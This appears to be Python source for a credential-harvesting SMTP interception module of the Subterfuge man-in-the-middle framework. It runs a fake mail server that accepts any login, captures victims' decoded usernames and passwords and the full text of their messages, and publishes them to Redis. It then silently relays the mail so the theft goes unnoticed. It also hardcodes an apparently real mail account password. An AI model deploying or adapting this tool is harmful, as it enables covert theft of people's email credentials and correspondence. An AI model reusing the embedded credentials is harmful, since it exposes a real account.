import sys
import binascii
import redis
import json
import time

from OpenSSL import SSL

from zope.interface import implements

from twisted.internet import defer, reactor, ssl
from twisted.mail import smtp
from twisted.mail.imap4 import LOGINCredentials
from twisted.python import log

try:
	from cStringIO import StringIO
except ImportError:
	from StringIO import StringIO



smtpRedisClient = None


class JJMessage(object):
	implements(smtp.IMessage)

	def __init__(self, protocol, recipient):
		self.protocol = protocol
		self.recipient = str(recipient)
		self.lines = []

	def lineReceived(self, line):
		self.lines.append(line)

	def eomReceived(self):
		print "New messsage received."
		self.lines.append('')
		messageData = '\n'.join(self.lines)
		messageData = str(messageData)
		# Publish mail to redis
		d = {}
		d['from'] = str(self.protocol.origin)
		d['to'] = str(self.protocol.origin)
		d['message'] = messageData
		d['time'] = int(time.time())
		try:
			smtpRedisClient.publish('new:mail', json.dumps(d))
		except:
			print "Publishing failed"
			pass

		# Really send mail here
		print 'REALLY SENDING THE MAIL'

		# this is just a test because of ipfw forwarding all traffic to my own machine -> infinite loop yo!

		self.protocol.username = 'wp10619035-johnny'
		self.protocol.password = 'aRvIpXalEYxLYwTY' 

		msg = StringIO(messageData)
		try:
			dfd = sendmail(self.protocol.username, self.protocol.password, self.protocol.origin, self.recipient, msg, self.protocol.destHost, self.protocol.destPort)
			dfd.addCallback(lambda result: lp("Real mail sent"))
		except:
			print "Mail sending failed"
			pass
		return defer.succeed(None)
		

	def connectionLost(self):
		print "Connection lost unexpectedly"

class JJMessageDelivery(object):
	implements(smtp.IMessageDelivery)

	def __init__(self, protocol):
		self.protocol = protocol

	def receivedHeader(self, helo, origin, recipients):
		clientHostname, clientIP = helo

	def validateFrom(self, helo, origin):
		self.protocol.origin = origin
		return origin

	def validateTo(self, user):
		return lambda: JJMessage(self.protocol, user)

class JJESMTP(smtp.ESMTP):

	# scraped stuff we need for later when actually sending the mail
	username = None
	password = None

	origin = None


	def __init__(self, chal = None, contextFactory = None):
		print "-- Say hello to JJESMTP, bitches!"
		smtp.ESMTP.__init__(self, chal, contextFactory)
		self.delivery = JJMessageDelivery(self)

	def sendLine(self, line):
		print "Sending: " + line
		return self.transport.writeSequence((line, self.delimiter))

	def lineReceived(self, line):
		print "Received: " + line
		self.resetTimeout()
		return getattr(self, 'state_' + self.mode)(line)

	def state_AUTH(self, response):
		
		if response is None:
		    challenge = self.challenger.getChallenge()
		    encoded = challenge.encode('base64')
		    self.sendCode(334, encoded)
		    return

		if response == '*':
		    self.sendCode(501, 'Authentication aborted')
		    self.challenger = None
		    self.mode = 'COMMAND'
		    return

		self.credentials_base64 = response
		try:
		    uncoded = response.decode('base64')
		    print uncoded
		    if not self.username:
		    	self.username = uncoded
		    	# Now ask for password
		    	self.sendCode(334, 'UGFzc3dvcmQ6')
		    	return
		    elif not self.password:
		    	self.password = uncoded
		    
		except binascii.Error:
			self.sendCode(501, 'Syntax error in parameters or arguments')
			return

		# simply say all is well if we have anything
		if self.username and self.password:
			self.mode = 'COMMAND'
			self.authenticated = True
			self.sendCode(235, 'Authentication successful.')

			# publish credentials to redis
			print 'Publishing mail account credentials to redis'
			c = {}
			c['date'] = int(time.time())
			c['username'] = self.username
			c['password'] = self.password
			try:
				smtpRedisClient.publish("new:mail_credentials", json.dumps(c))
			except:
				print "Publishing failed"
				pass


# For our SSL shizzl
class ServerTLSContext(ssl.DefaultOpenSSLContextFactory):
    def __init__(self, *args, **kw):
        kw['sslmethod'] = SSL.TLSv1_METHOD
        ssl.DefaultOpenSSLContextFactory.__init__(self, *args, **kw)


class JJSMTPFactory(smtp.SMTPFactory):
	protocol = JJESMTP

	def buildProtocol(self, addr):
		log.msg("building protocol")
		
		#
		# @todo: Here we should get the real host and port from iptables in Subterfuge somehow
		#
		
		destHost = "wp268.webpack.hosteurope.de"
		destPort = 587

		proto = smtp.SMTPFactory.buildProtocol(self, addr)
		proto.destHost = destHost
		proto.destPort = destPort

		# AUTH challengers
		proto.challengers = {"LOGIN": LOGINCredentials}

		# SSL
		proto.ctx = ServerTLSContext(privateKeyFileName='/usr/share/subterfuge/jjmail/certs/server.key', certificateFileName='/usr/share/subterfuge/jjmail/certs/server.crt')

		return proto


def configureSMTPTraffic():
	print 'Configuring mail traffic'
	log.startLogging(sys.stdout)
	
	# port 25
	reactor.listenTCP(9998, JJSMTPFactory())
	# port 465
	reactor.listenTCP(9997, JJSMTPFactory())
	# port 587
	reactor.listenTCP(9996, JJSMTPFactory())

	# kickoff
	setupRedis()
	reactor.run()

def setupRedis():
	print 'Setting up Redis for SMTP'
	global smtpRedisClient
	smtpRedisClient = redis.Redis(host="127.0.0.1", port=6379, db=0)

def lp(x):
	print x
	return None

def sendmail(
    authenticationUsername, authenticationSecret,
    fromAddress, toAddress,
    messageFile,
    smtpHost, smtpPort=25
    ):

    contextFactory = ssl.ClientContextFactory()
    contextFactory.method = SSL.SSLv3_METHOD

    resultDeferred = defer.Deferred()

    senderFactory = smtp.ESMTPSenderFactory(
        authenticationUsername,
        authenticationSecret,
        fromAddress,
        toAddress,
        messageFile,
        resultDeferred,
        contextFactory=contextFactory)

    reactor.connectTCP(smtpHost, smtpPort, senderFactory)

    return resultDeferred
